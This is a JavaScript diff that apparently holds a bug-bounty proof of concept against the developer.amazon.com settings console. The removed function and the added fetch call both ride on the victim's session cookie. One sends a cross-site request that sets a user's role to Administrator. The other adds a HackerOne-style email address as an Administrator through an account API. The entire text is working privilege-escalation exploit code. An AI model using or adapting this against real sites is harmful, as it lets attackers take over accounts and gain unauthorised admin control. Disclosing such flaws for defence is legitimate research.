@@ -14,19 +14,8 @@ function getCookie(cname) {
   return "";
 }
 
-function submitRequest()
-      {
-        var session_id = getCookie("session-id")
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https:\/\/developer.amazon.com\/settings\/console\/userpermissions\/save_edit.html", true);
-        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
-        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
-        xhr.withCredentials = true;
-        var body = session_id+"="+session_id+"&users%5B1%5D.roles=Administrator&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on&_users%5B1%5D.roles=on";
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i);
-        xhr.send(new Blob([aBody]));
-      }
-      submitRequest();
+fetch("https://developer.amazon.com/settings/console/api/addUserInfo", {
+  method: "POST",
+        headers: {"X-Settings-Custom-Header": getCookie('session-id'), "Content-Type":"application/json"},
+        body: '{"users":[{"email":"d3f4u17+acc2@wearehackerone.com","roles":["Administrator"]}]}'
+})
